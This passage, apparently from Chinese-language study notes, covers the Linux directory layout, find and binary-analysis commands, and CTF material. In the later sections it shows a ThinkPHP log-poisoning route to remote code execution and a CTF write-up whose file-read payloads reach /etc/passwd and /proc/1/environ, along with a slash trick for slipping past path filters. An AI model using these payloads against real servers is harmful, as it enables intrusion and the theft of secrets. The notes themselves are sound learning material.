号信息文件。</li><li><strong>&#x2F;etc&#x2F;fstab</strong>：文件系统挂载表。</li><li><strong>&#x2F;etc&#x2F;hosts</strong>：主机名和 IP 地址对应表。</li><li><strong>&#x2F;etc&#x2F;hostname</strong>：定义系统的主机名。</li><li><strong>&#x2F;etc&#x2F;network&#x2F;interfaces</strong>：网络接口配置文件（在基于 Debian 的系统中）。</li></ul><p>在 &#x2F;etc 目录中，每个服务和应用程序通常都有自己的子目录或配置文件，例如 Apache 的配置文件在 <code>/etc/apache2/</code> 下。</p><h4 id="home"><a href="#home" class="headerlink" title="/home"></a><strong><code>/home</code></strong></h4><p>用户的主目录所在之处，每个用户通常有一个以其用户名命名的子目录。root 用户的 HOME 目录，在：<code>/root</code>。</p><p>常见的文件和子目录包括：</p><ul><li><strong>~&#x2F;Documents</strong>：用户的文档目录。</li><li><strong>~&#x2F;Downloads</strong>：用户的下载目录。</li><li><strong>~&#x2F;Pictures</strong>：用户的图片目录。</li><li><strong>~&#x2F;.bashrc</strong>：Bash Shell 配置文件。</li><li><strong>~&#x2F;.profile</strong>：用户的环境设置文件。</li></ul><p>用户目录的权限设置通常是这样的，只有该用户和超级用户（root）可以访问和修改其内容。这可以保护用户的隐私和数据安全。</p><h4 id="lib"><a href="#lib" class="headerlink" title="/lib"></a><strong><code>/lib</code></strong></h4><p>lib 是 Library（库）的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。</p><p>目录包含系统库文件和内核模块。系统启动时，许多关键程序依赖于这些库文件。常见的库文件包括 C 标准库（libc.so）、动态链接器（ld-linux.so）等。内核模块（如文件系统驱动、硬件驱动）通常位于 <code>/lib/modules</code> 目录中。</p><h4 id="media"><a href="#media" class="headerlink" title="/media"></a><strong><code>/media</code></strong></h4><p>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</p><h4 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a><strong><code>/mnt</code></strong></h4><p>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 <code>/mnt/</code> 上，然后进入该目录就可以查看光驱里的内容了。</p><p>用于自动挂载的可移动设备，如光盘、U 盘等。当这些设备插入时，系统会自动将其挂载到 &#x2F;media 下的一个子目录中。例如，插入一个 U 盘后，系统可能会在 <code>/media/user/USB</code> 下自动创建一个目录并挂载该设备。</p><h4 id="opt"><a href="#opt" class="headerlink" title="/opt"></a><strong><code>/opt</code></strong></h4><p>opt 是 optional（可选） 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个 MySQL 数据库则就可以放到这个目录下。默认是空的。</p><p>&#x2F;opt 目录用于安装附加软件包。通常，第三方软件或自定义应用程序会安装在此目录下。每个软件通常会在 &#x2F;opt 下有一个独立的子目录，例如 <code>/opt/software</code>。这种方式可以避免与系统的其他部分产生冲突，并便于管理和卸载。</p><h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><strong><code>/proc</code></strong></h4><p>(<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用</a>)</p><p>proc 是 Processes（进程） 的缩写，<code>/proc</code> 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，</p><p>比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure><p>常见的文件和目录包括：</p><ul><li><strong>&#x2F;proc&#x2F;cpuinfo</strong>：显示 CPU 的信息，包括型号、速度和核心数。</li><li><strong>&#x2F;proc&#x2F;meminfo</strong>：显示内存使用情况，包括总内存、可用内存和缓存。</li><li><strong>&#x2F;proc&#x2F;uptime</strong>：显示系统的运行时间和空闲时间。</li><li>**&#x2F;proc&#x2F;[pid]&#x2F;**：每个运行中的进程都有一个以其 PID（进程标识符）命名的子目录，包含该进程的详细信息，如状态、内存映射、打开的文件等。</li></ul><p>&#x2F;proc 目录中的信息对于系统管理员和开发者来说非常重要，因为它提供了对系统运行状态的实时监控和调试工具。</p><h4 id="root"><a href="#root" class="headerlink" title="/root"></a><strong><code>/root</code></strong></h4><p>超级用户（root）的主目录。为确保系统在 <code>/home/</code> 不可用时也能启动，root 主目录不放在 <code>/home/</code> 中。</p><p>root 用户的主目录直接位于根目录下，因为 root 用户需要在单用户模式下进行系统维护和修复，&#x2F;root 目录可以在没有挂载其他文件系统的情况下访问。</p><p>常见的文件和目录包括：</p><ul><li><strong>&#x2F;root&#x2F;.bashrc</strong>：root 用户的 Bash Shell 配置文件。</li><li><strong>&#x2F;root&#x2F;.profile</strong>：root 用户的环境设置文件。</li></ul><p>root 用户拥有系统的最高权限，因此 &#x2F;root 目录中的文件和配置通常只有 root 用户本身可以访问和修改。</p><h4 id="run"><a href="#run" class="headerlink" title="/run"></a><strong><code>/run</code></strong></h4><p>一个临时文件系统（tmpfs），在系统启动早期就可用，用于存储运行时短暂数据，存放系统运行时的状态文件和进程信息。</p><p>它是在系统启动时动态创建的，并且其内容在每次启动时都会被清空。</p><p>它取代了旧位置如 <code>/var/run</code>、<code>/var/lock</code>、<code>/lib/init/rw</code>，以及某些 <code>/dev/.*</code> 和 <code>/dev/shm</code>。</p><p>常见的文件和目录包括：</p><ul><li><strong>&#x2F;run&#x2F;lock</strong>：用于锁文件，防止多个进程同时访问同一个资源。</li><li>**&#x2F;run&#x2F;user&#x2F;**：用于用户相关的运行时数据，每个用户都有一个以其 UID 命名的子目录。</li></ul><p>&#x2F;run 目录中的文件和目录通常由系统服务和守护进程使用，提供了一种轻量级的进程间通信方式。</p><h4 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a><code>/sbin</code></h4><p>s 就是 Super User 的意思，是 Superuser Binaries（超级用户的二进制文件）的缩写，这里存放的是系统管理员使用的系统管理程序。</p><p>常见的命令包括：</p><ul><li><p><strong>ifconfig</strong>：配置网络接口。</p></li><li><p><strong>reboot</strong>：重启系统。</p></li><li><p><strong>shutdown</strong>：关闭系统。</p></li><li><p><strong>fdisk</strong>：磁盘分区工具。</p></li><li><p><strong>mkfs</strong>：创建文件系统。</p></li></ul><p>这些命令对于系统管理员来说是至关重要的，因为它们涉及到系统的核心功能和配置。</p><h4 id="srv"><a href="#srv" class="headerlink" title="/srv"></a><strong><code>/srv</code></strong></h4><p>（service）可包含系统服务的数据目录，表示该目录用于存放系统提供的各种服务的数据。例如，Web 服务器的文件可以存放在 &#x2F;srv&#x2F;www 下，FTP 服务器的文件可以存放在 &#x2F;srv&#x2F;ftp 下。&#x2F;srv 目录结构可以根据具体服务的需求进行自定义。</p><h4 id="sys"><a href="#sys" class="headerlink" title="/sys"></a><strong><code>/sys</code></strong></h4><p>一个虚拟文件系统，可用于获取或设置内核对系统的视图信息。</p><p>与 &#x2F;proc 类似，&#x2F;sys 目录中的内容也是由内核在运行时动态生成的。&#x2F;sys 目录主要用于提供内核与用户空间之间的接口，允许用户查看和配置硬件设备。</p><p>常见的文件和目录包括：</p><ul><li>**&#x2F;sys&#x2F;class&#x2F;**：分类显示不同类型的设备，如网络设备（&#x2F;sys&#x2F;class&#x2F;net）、块设备（&#x2F;sys&#x2F;class&#x2F;block）等。</li><li>**&#x2F;sys&#x2F;devices&#x2F;**：显示系统中的所有设备，以设备树的形式组织。</li><li>**&#x2F;sys&#x2F;module&#x2F;**：显示已加载的内核模块及其参数。</li></ul><p>通过 &#x2F;sys 目录，用户和管理员可以方便地管理和配置系统硬件，进行性能调优和故障排除。</p><p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs。sysfs 文件系统集成了下面 3 种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。该文件系统是内核设备树的一个直观反映, 当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</p><h4 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a><strong><code>/tmp</code></strong></h4><p>Temporary（临时)用于存放应用程序的临时文件。系统和应用程序在运行过程中可能会在此目录下创建临时文件。通常，系统会在每次启动时清理 &#x2F;tmp 目录，以防止磁盘空间被临时文件占用过多。</p><p>&#x2F;tmp 目录中的文件通常对所有用户可读写，但应注意临时文件的权限和安全性。</p><h4 id="usr"><a href="#usr" class="headerlink" title="/usr"></a><strong><code>/usr</code></strong></h4><p>usr 是 Unix Shared Resources（共享资源） 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，包含了大量的二进制文件、库文件、文档和其他资源。类似于 windows 下的 <code>program files</code> 目录。</p><p>包含大部分用户工具和应用程序，部分结构类似于根目录（例如含有 <code>/usr/bin/</code> 和 <code>/usr/lib/</code>）。</p><p>常见的子目录包括：</p><ul><li><strong>&#x2F;usr&#x2F;bin</strong>：用户级命令的二进制文件。常见的命令有 <code>gcc</code>（GNU 编译器）、<code>perl</code>（Perl 解释器）等。</li><li><strong>&#x2F;usr&#x2F;sbin</strong>：系统管理命令的二进制文件。与 &#x2F;sbin 类似，但这些命令不是启动时必须的。</li><li><strong>&#x2F;usr&#x2F;lib</strong>：库文件目录，存放应用程序和系统所需的共享库。</li><li><strong>&#x2F;usr&#x2F;share</strong>：共享数据目录，存放不特定于某个用户或系统的共享数据，如文档、图标、声音等。</li><li><strong>&#x2F;usr&#x2F;local</strong>：本地安装的软件和文件。用户可以在不影响系统其他部分的情况下安装和管理软件。</li></ul><p><code>/usr</code> 目录中的内容通常由系统包管理器管理，如 apt、yum 等。</p><h4 id="var"><a href="#var" class="headerlink" title="/var"></a><strong><code>/var</code></strong></h4><p>Variable（变量）专用于存放变化的数据，如日志、数据库、网站数据以及可在多次启动间保留的邮件等临时数据。不同于 &#x2F;etc 目录中的配置文件，&#x2F;var 中的数据是动态变化的。<br>特别重要的子目录：<code>/var/log</code>，用于保存系统日志文件。</p><p>常见的子目录和文件包括：</p><ul><li><strong>&#x2F;var&#x2F;log</strong>：系统日志文件目录。常见的日志文件有 <code>/var/log/syslog</code>（系统日志）、<code>/var/log/auth.log</code>（认证日志）、<code>/var/log/kern.log</code>（内核日志）等。</li><li><strong>&#x2F;var&#x2F;mail</strong>：用户邮件存放目录。</li><li><strong>&#x2F;var&#x2F;spool</strong>：队列目录，用于存放打印任务、邮件队列等。</li><li><strong>&#x2F;var&#x2F;cache</strong>：应用程序缓存文件。</li><li><strong>&#x2F;var&#x2F;www</strong>：Web 服务器的根目录，存放网站文件。</li></ul><p>&#x2F;var 目录中的数据可能会迅速增长，因此需要定期清理和维护，以防止磁盘空间不足。</p><h3 id="命令-查找文件"><a href="#命令-查找文件" class="headerlink" title="命令&#x2F;查找文件"></a>命令&#x2F;查找文件</h3><h4 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h4><p><code>whatis</code>、<code>info</code> 和 <code>man</code> 的作用都是是查看命令的说明。区别是：</p><ul><li><code>whatis</code> 简要说明命令的作用；</li><li><code>info</code> 详细的说明文档；</li><li><code>man</code> 查询命令的说明文档</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查看 ls 命令的简要说明</span><br><span class="line">whatis ls</span><br><span class="line"># 查看详细的说明</span><br><span class="line">info ls</span><br><span class="line"></span><br><span class="line">man 命令名       # 查看详细手册页</span><br><span class="line">--help           # 快速帮助，如：cp --help</span><br></pre></td></tr></table></figure><h4 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h4><table><thead><tr><th>命令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>find</code></td><td>在目录中查找文件（条件强大）</td><td><code>find /home -name &quot;*.txt&quot;</code></td></tr><tr><td><code>locate</code></td><td>快速查找文件名（基于数据库）</td><td><code>locate file.txt</code></td></tr><tr><td><code>which</code></td><td>查找命令路径（可执行文件）</td><td><code>which python</code></td></tr><tr><td><code>whereis</code></td><td>查找命令源文件&#x2F;帮助文档等</td><td><code>whereis ls</code></td></tr></tbody></table><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><p><a href="https://github.com/guobinhit/cg-blog/blob/master/articles/linux/tutorials/find.md">Linux 命令之 find</a></p><ul><li><p>查找当前目录及其子目录下所有文件和文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find.</span><br></pre></td></tr></table></figure></li><li><p>在<code>/home</code>目录下查找以<code>.txt</code>结尾的文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`find /home -name &quot;*.txt&quot;`</span><br></pre></td></tr></table></figure></li><li><p>组合查找文件名以<code>file1</code>开头（与、或、非）<code>file2</code>开头的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">组合查找语法：</span><br><span class="line"> -a        与（取交集）</span><br><span class="line"> -o        或（取并集）</span><br><span class="line"> -not      非（同 ！）</span><br><span class="line"> !         非（同 not）</span><br><span class="line"></span><br><span class="line">find . -name &quot;file1*&quot; -a -name &quot;file2*&quot;</span><br><span class="line">find . -name &quot;file1*&quot; -o -name &quot;file2*&quot;</span><br><span class="line">find . -name &quot;file1*&quot; -not -name &quot;file2*&quot;</span><br><span class="line">find . -name &quot;file1*&quot; ! -name &quot;file2*&quot;\</span><br></pre></td></tr></table></figure></li><li><p>基于目录深度进行搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在当前目录下，限制最大深度为 3,查找类型是普通文件</span><br><span class="line">find . -maxdepth 3 -type f</span><br><span class="line"></span><br><span class="line">限制最大深度为 2</span><br><span class="line">find . -maxdepth 2 -type f</span><br></pre></td></tr></table></figure></li><li><p>基于文件权限进行搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">搜索权限为 777 的文件</span><br><span class="line">find . -type f -perm 777</span><br><span class="line"></span><br><span class="line">搜索 .txt 格式且权限不为 777 的文件</span><br><span class="line">find . -type f -name &quot;*.txt&quot; ! -perm 777</span><br></pre></td></tr></table></figure></li></ul><h3 id="文件应用实例"><a href="#文件应用实例" class="headerlink" title="文件应用实例"></a>文件应用实例</h3><h4 id="分析bin文件"><a href="#分析bin文件" class="headerlink" title="分析bin文件"></a>分析bin文件</h4><p><a href="https://blog.csdn.net/yychuyu/article/details/106265828">Linux下分析bin文件的10种方法</a></p><h5 id="file"><a href="#file" class="headerlink" title="file"></a><code>file</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 命令用于分析文件的类型。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250717164648976.png" alt="image-20250717164648976"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250717165128508.png" alt="image-20250717165128508"></p><h5 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a><code>ldd</code></h5><p><code>ldd 命令可以用于分析可执行文件的依赖</code>。</p><h5 id="ltrace"><a href="#ltrace" class="headerlink" title="ltrace"></a><code>ltrace</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace的功能是能够跟踪进程的库函数调用。</span><br></pre></td></tr></table></figure><h5 id="strace"><a href="#strace" class="headerlink" title="strace"></a><code>strace</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace 命令可以用于追踪程序运行过程中的系统调用及信号。</span><br></pre></td></tr></table></figure><h5 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a><code>hexdump</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump 命令用来查看二进制文件的 16 进制编码，但实际它能查看任何文件，而不限于二进制文件。</span><br></pre></td></tr></table></figure><h5 id="strings"><a href="#strings" class="headerlink" title="strings"></a><code>strings</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 命令可以用来打印二进制文件中可显示的字符。</span><br></pre></td></tr></table></figure><h5 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a><code>readelf</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf 一般用于查看 ELF 格式的文件信息。</span><br></pre></td></tr></table></figure><h5 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a><code>objdump</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump是用查看目标文件或者可执行的目标文件的构成的GCC工具。</span><br></pre></td></tr></table></figure><h5 id="nm"><a href="#nm" class="headerlink" title="nm"></a><code>nm</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm命令主要是列出目标文件的符号（说白了就是一些函数和全局变量等）。</span><br></pre></td></tr></table></figure><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a><code>gdb</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 就是所谓的 GNU debugger。</span><br></pre></td></tr></table></figure><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/7d8759f96f35e3ceb5c4d940dc34c144_compress.jpg" alt="7d8759f96f35e3ceb5c4d940dc34c144_compress"></p><p>这张图的内容是一个关于 Web 漏洞测试或日志分析相关的说明，主要涉及到 ThinkPHP 框架的日志记录路径和可能存在的代码执行漏洞。下面我来为你逐段讲解：</p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p><strong>第2点内容讲解：</strong></p><blockquote><p>“返回包提示发生错误，证明被记入了日志。”</p></blockquote><p>这句话的意思是，你在访问 Web 服务的时候，如果请求产生了错误（如参数错误或路径错误），那么这个错误信息就会被记录在日志文件中。</p><blockquote><p>“该日志默认路径在：（日志文件名与记录的时间有关）”</p></blockquote><p>这里指出了 ThinkPHP 框架（或类似结构的框架）会将错误日志记录在特定路径下，路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Application\Runtime\Logs\Common\24_04_03.log</span><br></pre></td></tr></table></figure><ul><li><code>Application\Runtime\Logs\Common\</code> 是固定的日志目录；</li><li><code>24_04_03.log</code> 表示的是日志的文件名，其中：<ul><li><code>24</code> 表示年份（2024）；</li><li><code>04</code> 表示月份（4月）；</li><li><code>03</code> 表示日期（3日）；</li></ul></li></ul><p><strong>总结：</strong><br> 这个日志文件记录了 2024 年 4 月 3 日的错误信息。发生错误后，可以去这个文件中查看服务器返回了什么错误信息，有助于分析系统行为，或者在渗透测试中挖掘可用信息。</p><p><strong>第3点内容讲解：</strong></p><blockquote><p>“访问代码存储位置，以上输入的代码将会被解析执行”</p></blockquote><p>这一句是关键，说明可能存在 <strong>代码执行漏洞</strong> 或 <strong>文件包含漏洞</strong>。</p><p>这段 URL 所示的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/24_04_03.log</span><br></pre></td></tr></table></figure><p>这个请求等价于调用了 <code>index.php</code> 文件，并传递了以下参数：</p><ul><li><code>m=Home</code>：模块名为 Home；</li><li><code>c=Index</code>：控制器名为 Index；</li><li><code>a=index</code>：动作（方法）名为 index；</li><li><code>value[_filename]=./Application/Runtime/Logs/Common/24_04_03.log</code>：传入的 value 参数中包含 <code>_filename</code> 这个键，其值为一个日志文件路径。</li></ul><p><strong>核心含义（可能存在漏洞的原因）：</strong></p><p>这意味着系统可能会根据传入的 <code>_filename</code> 参数来 <strong>读取并解析对应的文件内容</strong>，如果日志文件中含有一些可被执行的 PHP 代码片段（如攻击者注入的 payload），而且系统会对其 <code>include</code> 或 <code>eval</code>，那么就可能实现 <strong>远程代码执行（RCE）</strong>。</p><p>也就是说：</p><ul><li>你先访问系统，让它在日志中写入你的恶意代码；</li><li>然后你通过 <code>_filename</code> 参数让系统读取这个日志文件；</li><li>如果系统有漏洞，读取日志的过程中就可能解析并执行你的代码。</li></ul><h5 id="与"><a href="#与" class="headerlink" title="&#x2F;与\"></a>&#x2F;与\</h5><p> <strong>主要区别与用途</strong></p><table><thead><tr><th>对比维度</th><th><code>/</code>（斜杠）</th><th><code>\</code>（反斜杠）</th></tr></thead><tbody><tr><td><strong>路径用途</strong></td><td>Unix&#x2F;Linux&#x2F;macOS 中的路径分隔符</td><td>Windows 中的路径分隔符</td></tr><tr><td><strong>命令行使用</strong></td><td>作为参数前缀（Linux 常见）</td><td>作为转义符（Windows CMD 特定）</td></tr><tr><td><strong>程序字符串中</strong></td><td>普通字符</td><td>转义字符，用来转义特殊字符</td></tr><tr><td><strong>URL 地址中</strong></td><td>分隔路径：<code>https://a.com/x/y</code></td><td>不能使用，URL 中不合法</td></tr></tbody></table><p><strong>在不同系统中的用法</strong></p><ul><li><p>Linux &#x2F; macOS &#x2F; Unix 系统</p><p>使用 <code>/</code> 作为目录分隔符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/user/docs/file.txt</span><br></pre></td></tr></table></figure></li><li><p>Windows 系统</p><p>使用 <code>\</code> 作为路径分隔符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin\Documents\file.txt</span><br></pre></td></tr></table></figure></li></ul><p><strong>在编程语言中的用法</strong></p><ul><li><p><strong>1.<code>/</code> 斜杠</strong></p></li><li><p>常用作路径、数学除法等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = 10 / 2  # 数学除法</span><br><span class="line">open(&quot;folder/file.txt&quot;)  # Linux路径</span><br></pre></td></tr></table></figure></li><li><p><strong>2.<code>\</code> 反斜杠</strong></p></li><li><p>转义符，用来表达特殊字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Hello\nWorld&quot;)   # 换行</span><br><span class="line">print(&quot;He said: \&quot;Hi\&quot;&quot;)  # 输出引号</span><br></pre></td></tr></table></figure></li><li><p>如果你真的要在字符串中使用反斜杠本身，要写成 <code>\\</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;C:\\Users\\Admin\\file.txt&quot;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>URL 和 Web 中的使用</strong></p><p>URL 中统一使用 <code>/</code> 作为路径分隔符，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/images/pic.jpg</span><br></pre></td></tr></table></figure><p><code>\</code> 在 URL 中是非法字符，浏览器会自动替换或报错。</p><h4 id="Proc"><a href="#Proc" class="headerlink" title="&#x2F;Proc"></a>&#x2F;Proc</h4><p><a href="https://www.nssctf.cn/problem/3780">[HDCTF 2023]YamiYami</a>  <a href="https://blog.csdn.net/m0_73512445/article/details/132723637">[HDCTF 2023]YamiYami题解</a></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250718115250025.png" alt="image-20250718115250025"></p><p>点击Read somethings直接跳转到了百度</p><p>探测漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?file=///etc/passwd</span><br></pre></td></tr></table></figure><p>返回正常内容：漏洞存在（任意文件读取）,没有 flag，继续下一步</p><p>从<code>url</code>中发现存在任意<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>，因为不知道flag在哪，所以考虑读环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///proc/1/environ </span><br><span class="line"></span><br><span class="line">#引用的是进程 ID 为 1 的 init 进程的环境变量。init 进程是 Linux 系统中的第一个用户空间进程，它负责启动和管理其他用户进程。</span><br></pre></td></tr></table></figure><table><thead><tr><th>部分</th><th>含义</th></tr></thead><tbody><tr><td><code>///</code></td><td>多余的斜杠在 Unix&#x2F;Linux 中等同于 <code>/</code>，所以这和 <code>/proc/1/environ</code> 是一样的。可以用于<strong>绕过某些路径过滤</strong>。</td></tr><tr><td><code>/proc</code></td><td>Linux 的 <strong>伪文件系统</strong>，用来表示运行中进程的信息。</td></tr><tr><td><code>/proc/1</code></td><td>表示进程号为 <code>1</code> 的进程，通常是容器或系统中最先启动的进程。 在容器（如 Docker）里，这往往就是你运行的服务程序（比如 Flask 或 Node.js）。</td></tr><tr><td><code>/proc/1/environ</code></td><td>存储该进程的<strong>环境变量</strong>，每个变量以 null 字符（<code>\x00</code>）分隔。</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250718115335691.png" alt="image-20250718115335691"></p><h2 id="绝对路径和相对路径"><a href="#绝对路径和相对路径" class="headerlink" title="绝对路径和相对路径"></a>绝对路径和相对路径</h2><p>路径是指文件和目录的引用方式。它给出了文件或目录在 [Linux 目录结构](<a href="https://so.csdn.net/so/search?q=Linux">https://so.csdn.net/so/search?q=Linux</a> 目录结构&amp;spm&#x3D;1001.2101.3001.7020)中的位置，由名称和斜杠组成。</p><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>以字符 <code>/</code> 开头（代表根目录，所有其他文件和目录都在其中）。之后依次列出到达目标文件所需经过的每个子目录，每个名称之间用 <code>/</code> 分隔。。</p><p>例如，<code>/home/liujie/桌面/file.txt</code>是一个绝对路径，它明确指定了文件<code>file.txt</code>的位置。</p><p>绝对路径始终指向相同的位置，不受当前工作目录的变化影响。这使得它们在脚本和<a href="https://so.csdn.net/so/search?q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">配置文件</a>中非常有用，因为它们的行为是可预测的。</p><p><strong>绝对路径</strong>：在需要确保文件或目录位置始终一致的情况下使用绝对路径。这对于脚本、配置文件和需要完全确定位置的任务非常重要</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708103126925.png" alt="image-20250708103126925"></p><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>相对路径是相对于当前工作目录的路径描述。它告诉系统如何从当前位置找到目标文件或目录。相对路径通常使用以下几种符号：</p><p><code>.</code>：表示当前目录。例如，.&#x2F;file.txt表示当前目录中的文件。</p><p><code>..</code>：表示上一级目录。例如，..&#x2F;parent_directory&#x2F;file.txt表示上一级目录中的文件。</p><p><code>目录名</code>：表示当前目录中的子目录。例如，subdir&#x2F;file.txt表示当前目录下的子目录中的文件。</p><p>相对路径相对简洁，但依赖于当前工作目录，因此可能在不同位置使用时产生不同的效果。</p><p><strong>相对路径</strong>：通常在当前工作目录不会改变的情况下使用相对路径。手动浏览文件系统或在脚本中执行相对路径的命令时，相对路径是有用的。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708101406856.png" alt="image-20250708101406856"></p><h3 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h3><p><code>.</code> :  表示当前目录，比如 cd .&#x2F;Desktop 表示切换到当前目录下的Desktop目录中，和 cd Desktop效果一致。<br><code>..</code>: 表示上一级目录，比如 cd .. 即可切换到上一级目录， cd ..&#x2F;.. 切换到上二级的目录<br><code>~</code>  : 表示HOME目录，比如：cd ~即可切换到home目录。cd ~&#x2F;Desktop,切换到Home内的Desktop目录。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708104357969.png" alt="image-20250708104357969"></p><h3 id="url中的路径使用"><a href="#url中的路径使用" class="headerlink" 